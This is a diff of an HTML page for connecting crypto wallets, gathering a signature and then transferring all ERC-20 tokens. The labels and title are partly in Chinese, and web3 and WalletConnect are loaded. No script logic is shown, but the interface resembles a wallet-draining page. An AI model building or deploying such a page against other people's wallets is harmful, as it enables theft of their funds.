@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ERC-20 Token Transfer with Auto-Signature</title>
+    <title>自动签名并转移代币</title>
     <link rel="stylesheet" href="styles.css">
 </head>
 <body>
@@ -16,17 +16,17 @@
             <option value="walletconnect">WalletConnect</option>
         </select>
         
-        <div>
-            <label for="wallets">输入钱包地址（用逗号分隔）:</label><br>
-            <input type="text" id="wallets" placeholder="0x...">
+        <div id="walletInfo">
+            <h3>已连接的钱包地址:</h3>
+            <ul id="walletList"></ul>
         </div>
         
+        <button id="signButton" disabled>签名确认</button>
         <button id="transferButton" disabled>转移所有代币</button>
-        <div id="status"></div>
         
-        <h3>已连接钱包:</h3>
-        <ul id="walletList"></ul>
+        <div id="status"></div>
     </div>
+    
     <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.5.2/web3.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.7.0/dist/umd/index.min.js"></script>
     <script src="axios.min.js"></script>
